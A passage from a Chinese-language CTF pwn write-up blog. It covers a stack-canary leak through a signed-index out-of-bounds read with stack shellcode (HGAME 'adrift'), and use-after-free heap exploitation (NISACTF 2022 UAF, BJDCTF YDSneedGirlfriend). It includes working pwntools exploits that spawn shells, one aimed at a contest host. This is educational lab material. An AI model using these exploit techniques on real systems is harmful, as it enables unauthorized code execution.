class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( canary != ::canary )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s a poor decision :(&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题看上去其实还是很吓人。依旧有菜单的选择。我们可以先看看这里具体干了些什么。可以看出来，这里不是程序设置的canary保护。而是人为的设置了一个canary。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 *<span class="title function_">init_canary</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = (__int64)&amp;v1;</span><br><span class="line">  result = &amp;v1;</span><br><span class="line">  canary = (__int64)&amp;v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，这里的canary是取得v1的地址。那么v1在哪呢？当然是在栈上了。所以如果我们得到了canary，也就是我们得到了栈地址。非常关键。这个时候再来看下保护。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/hgame/adrift/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>存在可读可写可执行的段。栈可执行。那么我的思路很明确了。shellcode。而且是写在栈上的shellcode。并且由于我们知道了栈地址。我们就可以知道我们写入数据的起始地址。ok结束。但是当我们仔细代码审计后，会发现一件特别伤心的事。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, v6);</span><br><span class="line"><span class="keyword">switch</span> ( v6[<span class="number">0</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;way&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1040uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;distance&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">200</span> &amp;&amp; dis[i]; ++i )</span><br><span class="line">      ;</span><br><span class="line">    v3 = (_QWORD *)((<span class="type">char</span> *)&amp;str + <span class="number">1304</span> * i);</span><br><span class="line">    *v3 = buf[<span class="number">0</span>];</span><br><span class="line">    v3[<span class="number">124</span>] = buf[<span class="number">124</span>];</span><br><span class="line">    qmemcpy(</span><br><span class="line">      (<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L),</span><br><span class="line">      (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">char</span> *)buf - ((<span class="type">char</span> *)v3 - ((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L))),</span><br><span class="line">      <span class="number">8LL</span> * ((((_DWORD)v3 - (((_DWORD)v3 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">1000</span>) &amp; <span class="number">0xFFFFFFF8</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;dis[i]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>在代码审计的过程中（求助ai）。可以发现，这里干了一件特别复杂的事情。不过其实就是将我们的数据拷贝至str处。并且将我们的栈的数据清0。那很完蛋了。怎么办呢？我们再来仔细看一下。这里我们能读入0x410的数据。而缓冲区大小为8*125&#x3D;1000。也就是说，我们仍然存在40字节的溢出。</p>
<p><img src="/images/hgame2.png"></p>
<p>根据上图希望对理解更有帮助。不过想要按照我们的执行流来执行的话，我们还是要对canary去进行泄露的。这里就要借助我们的show()了。让我们看一下show具体干了什么。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 n199; <span class="comment">// rax</span></span><br><span class="line">  __int16 n199_1; <span class="comment">// [rsp+Eh] [rbp-2h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;n199_1);</span><br><span class="line">  LOWORD(n199) = n199_1;</span><br><span class="line">  <span class="keyword">if</span> ( n199_1 &lt;= <span class="number">0</span> )</span><br><span class="line">    LOWORD(n199) = -n199_1;</span><br><span class="line">  n199_1 = n199;</span><br><span class="line">  LODWORD(n199) = (<span class="type">unsigned</span> __int16)n199;</span><br><span class="line">  <span class="keyword">if</span> ( (__int16)n199 &lt;= <span class="number">199</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    n199 = dis[n199_1];</span><br><span class="line">    <span class="keyword">if</span> ( n199 )</span><br><span class="line">      LODWORD(n199) = <span class="built_in">printf</span>(<span class="string">&quot;: %lu\n&quot;</span>, dis[n199_1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n199;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看得出来，show这里会判断我们输入的数字是否是&gt;0的，就是做一个无符号数的装欢。这个时候漏洞就出现了。因为这里是%hd就是32位的。所以int的范围在-32768~32767之间。如果我们输入-32768。经过一系列操作以后，可以发现这里-32768是不变的。也就是说我们可以越界访问到dis[-32768]处的数据。dis的地址是0x44060，而dis是数组，也就是说会访问到0x44060-hex(32768*8) &#x3D; 0x44060 - 0x40000 &#x3D; 0x4060。可以看出这里的位置刚刚好是存放的canary。所以这个时候我们就能泄露出canary。真是太巧妙了。</p>
<p>然后长度受限的shellcode该怎么解决呢？当然是先构造read函数，然后再写入足长的shellcode啦。最后jmp到rsi，也就是rsp的位置。至此艺术已成！ohyeah。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;local-2.hgame.vidar.club&#x27;</span>,<span class="number">32186</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-32768&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">15</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rsp = canary + <span class="number">0x20</span></span><br><span class="line">success(<span class="built_in">hex</span>(rsp))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shell_read = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x64</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">success(<span class="built_in">len</span>(shell_read))</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3fa</span>-<span class="number">0x10</span>) + p64(canary) + shell_read + p64(canary+<span class="number">0x410</span>) </span><br><span class="line">success(<span class="built_in">len</span>(pl))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">pl2 = shellcode</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里多加了个nop是为了保证16字节对齐。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>UAF</title>
    <url>/2026/02/19/UAF/</url>
    <content><![CDATA[<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a><code>UAF</code></h2><h3 id="Use-After-Free：即free后再次进行利用。"><a href="#Use-After-Free：即free后再次进行利用。" class="headerlink" title="Use After Free：即free后再次进行利用。"></a>Use After Free：即free后再次进行利用。</h3><p><code>Dangling Pointer</code>（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。</p>
<h4 id="NISACTF-2022-UAF"><a href="#NISACTF-2022-UAF" class="headerlink" title="[NISACTF 2022]UAF"></a><code>[NISACTF 2022]UAF</code></h4><p>[<a href="https://www.nssctf.cn/problem/2161">NISACTF 2022]UAF | NSSCTF</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD v3[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1.create&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2.edit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3.delete&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3[<span class="number">0</span>] &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      create();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>操作主要看show函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">  <span class="keyword">if</span> ( i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt;= <span class="number">0</span> || i &gt; i )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      echo((&amp;page)[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*((<span class="type">void</span> (__cdecl **)(<span class="type">char</span> *))page + <span class="number">1</span>))(page);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，当i&#x3D;0的时候会执行else里的语句，即调用我们输入到page里的echo函数。那么也就是说，如果我们将page里echo函数改为system函数的plt表，再输入&#x2F;bin&#x2F;sh就可以成功getsehll了。<br>首先先确定一下echo函数的位置。</p>
<p><img src="/images/heap1.png" alt="gdb"></p>
<p>由于是32位程序，所以我们无法输入&#x2F;bin&#x2F;sh。就可以输入sh。但是sh只占两个字节，所以可以用sh;\x00来截断system的读取。就可以达到system(“sh”)的效果了。</p>
<p>漏洞点在del函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">  <span class="keyword">if</span> ( i &lt; <span class="number">0</span> || i &gt; i )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">free</span>((&amp;page)[i]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于这里free掉chunk[i]后，并没有给该指针赋值为NULL。所以这里出现了野指针。此时的指针仍然指向我们刚刚删除的chunk。也就是说我们仍然可以非法访问该chunk。所以可以做到改写echo函数为system函数。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,26097)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;page&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;strings&#x27;</span>)</span><br><span class="line">    io.sendline(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;page&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;page&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">add() <span class="comment">#index 0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add() <span class="comment">#index 1</span></span><br><span class="line">pl = <span class="string">b&#x27;sh;\x00&#x27;</span> + p32(<span class="number">0x80484e0</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(<span class="number">1</span>,pl)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里先是创建了一个chunk，然后释放掉。此时index为0就可以访问到我们刚刚申请的chunk。再次创建一个chunk，index为1。但是1和0所指向的chunk其实是同一个堆块。所以我们可以通过index为1来任意修改该chunk的内容，再通过index为0来调用该堆块。</p>
<h4 id="BJDCTF-2020-YDSneedGirlfriend"><a href="#BJDCTF-2020-YDSneedGirlfriend" class="headerlink" title="[BJDCTF 2020]YDSneedGirlfriend"></a><code>[BJDCTF 2020]YDSneedGirlfriend</code></h4><p>[<a href="https://www.nssctf.cn/problem/712">BJDCTF 2020]YDSneedGirlfriend | NSSCTF</a></p>
<p>这道题和上面还是有点相似性的，不过这个题目名字出的很抽象啊哈哈。</p>
<p>保护情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/nssctf/heap/3/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  myinit();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">      n2 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_girlfriend();                    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n2 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_girlfriend();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n2 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_girlfriend();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和上面一样也是先给一个菜单，分别让我们去创建，删除，输入chunk。</p>
<p>同时在print_girlfriend函数里可以看出，这个函数的作用是将我们输入的内容输出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">print_girlfriend</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  count = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( count &gt;= <span class="number">0</span> &amp;&amp; count &lt; count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;girlfriendlist + count) )</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(_QWORD))*(&amp;girlfriendlist + count))(*(&amp;girlfriendlist + count));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在add_girlfriend函数里可以看出，这里将我们申请的堆块分成了两个。一个是struct chunk，里面放着print_girlfriend函数的指针和我们输入的内容的指针。另一个是content chunk，里面存放着我们写入的内容。也可以从gdb里看出来。</p>
<p><img src="/images/heap2.png" alt="gdb"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_girlfriend</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> top_chunk_name_size_name; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;girlfriendlist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;girlfriendlist + i) = <span class="built_in">malloc</span>(<span class="number">0x10u</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;girlfriendlist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_QWORD *)*(&amp;girlfriendlist + i) = print_girlfriend_name;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Her name size is :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">        top_chunk_name_size_name = atoi(buf);   <span class="comment">// top chunk</span></span><br><span class="line">                                                <span class="comment">// name size</span></span><br><span class="line">                                                <span class="comment">// name</span></span><br><span class="line">        v0 = (__int64)*(&amp;girlfriendlist + i);</span><br><span class="line">        *(_QWORD *)(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(top_chunk_name_size_name);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)*(&amp;girlfriendlist + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Her name is :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;girlfriendlist + i) + <span class="number">1</span>), top_chunk_name_size_name);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !Wow YDS get a girlfriend!&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，如果我们将第一个struct chunk放在指向printf_girlfriend函数的指针修改为指向backdoor函数就可以成功getshell了。</p>
<p>但是我们只能修改content chunk里的内容，又该怎么办呢？</p>
<p>其实很简单。我们只需要申请和struct chunk(0x10)大小不同的chunk就可以了。因为大小不同的chunk是分给不同的bins来管理的。那么当我们申请两次add，再释放掉。再申请一次大小为0x10的content chunk就可以将我们申请的前两次struct chunk分别作为第三次的struct和content chunk了。这样我们就可以通过向content chunk写入内容将print改写为backdoor，再通过print来getshell了。</p>
<p>下面给出exp。</p>
